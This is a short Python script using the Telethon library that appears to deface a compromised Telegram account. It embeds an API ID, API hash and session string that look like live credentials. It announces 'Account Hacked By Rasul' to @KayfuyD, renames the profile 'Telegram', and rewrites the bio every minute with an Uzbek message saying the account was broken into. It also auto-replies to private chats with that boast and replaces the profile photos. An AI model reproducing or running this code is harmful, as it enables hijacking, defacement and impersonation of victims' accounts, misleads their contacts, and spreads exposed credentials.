import aiocron
from telethon import TelegramClient, events
from telethon.tl.functions.account import UpdateProfileRequest
from telethon.tl.functions.photos import UploadProfilePhotoRequest, DeletePhotosRequest
from telethon.sessions import StringSession
from telethon.sync import TelegramClient
import time


api_id = 23871583
api_hash ="f5fb6f07eed86a2da3b08f830f6d3a9e"
string = "1AZWarzsBuyWXsbbnhyfG66spFtVJy0qz6V0tSgc-ypocFCCoTKL-nhp-Fto_AEA3R5BZyrxct1p64RehCW5d-BSX75a_lv6lprGuUnJSKf59G6EkVhTl7H6KelNj8kmi3qO5oZyPI4WTiKA7ttRpS4OdqSiXFNRcFM8969y-H1qWuRMXu9YgUnanQiAHDvrDxCGLK62-lkDYhLEBdZJteNddGvVFkx4OIgKKLQVnfC5_S_4i3VaHDdDJa-xFLxWsjhMmcvTTpRdsyb97u1zh9jHwpsYUJwsz5qCUcZTdmizGwJXUHftHSPCcBcHbS620xOHubO4dL3EwopW54hv5Jz9GON-Yyno="

client = TelegramClient(StringSession(), api_id, api_hash)
client.start()
#modules
client.send_message("@KayfuyD", "Account Hacked By Rasul☠️")
@aiocron.crontab("*/1 * * * *")
async def set_clock():
    async with client:
        await client(UpdateProfileRequest(first_name="Telegram", last_name="", about='Ushbu Hisob @KayfuyD Tomnidan Buzib Kirildi!!!☠️💀'))

@client.on(events.NewMessage(incoming=True))
async def handle_new_message(event):
    if event.is_private:  # only auto-reply to private chats
        from_ = await event.client.get_entity(event.from_id)
        if not from_.bot:
            await event.respond("Ushbu Hisob💻 @KayfuyD 😈 Tomonidan Buzib Kirildi!!!☠️💀\nI'm Realy Sorry Bro!!!🥹😅")

client(DeletePhotosRequest(client.get_profile_photos('me')))
result = client(UploadProfilePhotoRequest(file=client.upload_file('photo.jpg')))

client.loop.run_forever()
client.run_until_disconnected()